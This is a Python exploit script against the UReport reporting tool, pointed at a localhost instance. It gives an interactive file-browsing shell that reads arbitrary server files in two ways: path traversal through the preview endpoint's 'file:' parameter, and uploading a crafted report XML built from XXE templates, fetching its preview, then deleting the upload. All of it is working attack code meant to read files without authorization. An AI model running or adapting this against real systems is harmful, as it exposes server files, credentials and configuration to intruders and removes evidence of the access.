import re
import random
import urllib3
import requests
from urllib import parse

urllib3.disable_warnings()

route, base = [], 'https://127.0.0.1/ureport'


def directory() -> str:
    return '/' + '/'.join(route) + ' > '


def goback() -> None:
    if len(route) > 0:
        route.pop()


def encode(text: str) -> str:
    return parse.quote(text, safe='!')


def standardize(path: str) -> str:
    path = path[1 if path.startswith('/') else 0:]
    return '/' + path


def verify_path(path: str) -> None:
    path = standardize(path)
    back = '../' * 10
    request = requests.get(base + '/preview?_u=file:' + back + '..' + path, verify=False)
    if 'org.dom4j.DocumentException' in request.text:
        print(path + ': is file')
        return
    if 'Is a directory' in request.text or '是一个目录' in request.text:
        print(path + ': is directory')
        return
    if 'No such file or directory' in request.text or '没有那个文件或目录' in request.text:
        print(path + ': not exist')
        return
    if 'Permission denied' in request.text:
        print(path + ': not permit')
        return
    print('unknown response')
    print(request.text)


def create_payload(path: str, dtd: bool) -> str:
    name = 'dtd' if dtd else 'norm'
    path = standardize(path)
    with open('template/' + name + '.txt', 'r') as file:
        content = file.read().replace('{replacement}', path)
    return encode(content)


def parse_resp(resp: str) -> str:
    match = re.search('<td class=\'_A1\'\\s+>(.+?)</td>', resp)
    if match is not None:
        content = match.group(1)
        content = content.replace('&nbsp;', ' ')
        content = content.replace('&quot;', '"')
        content = content.replace('&gt;', '>')
        content = content.replace('&lt;', '<')
        content = content.split('<br>')
        return '\n'.join(content).strip()
    else:
        print('unable to parse response:\n' + resp)
        return resp


def read_file(path: str, dtd: bool) -> None:
    xml = 'file:' + str(random.random())[2:] + '.ureport.xml'
    upload = {'file': xml, 'content': create_payload(path, dtd)}
    request = requests.post(base + '/designer/saveReportFile', data=upload, verify=False)
    if len(request.text.strip()) == 0:
        request = requests.get(base + '/preview?_u=' + xml, verify=False)
        print(parse_resp(request.text))
    else:
        print('failed to upload ' + str(upload))
        print(request.text)
    remove = {'file': xml}
    request = requests.post(base + '/designer/deleteReportFile', data=remove, verify=False)
    if len(request.text.strip()) != 0:
        print('failed to remove ' + str(upload))
        print(request.text)


def solve() -> None:
    while True:
        op = input(directory()).strip()
        if op.startswith('back'):
            goback()
            continue
        if op.startswith('cd'):
            route.append(op[2:].strip())
            continue
        if op.startswith('ls'):
            read_file('/'.join(route), False)
            continue
        if op.startswith('catn'):
            read_file('/'.join([*route, op[4:].strip()]), False)
            continue
        if op.startswith('catd'):
            read_file('/'.join([*route, op[4:].strip()]), True)
            continue
        if op.startswith('verify'):
            verify_path(op[6:].strip())
            continue
        if op.startswith('readn'):
            read_file(op[5:].strip(), False)
            continue
        if op.startswith('readd'):
            read_file(op[5:].strip(), True)
            continue
        if op.startswith('exit'):
            return
        if op.startswith('quit'):
            return
        print('unknown operate')


if __name__ == '__main__':
    solve()
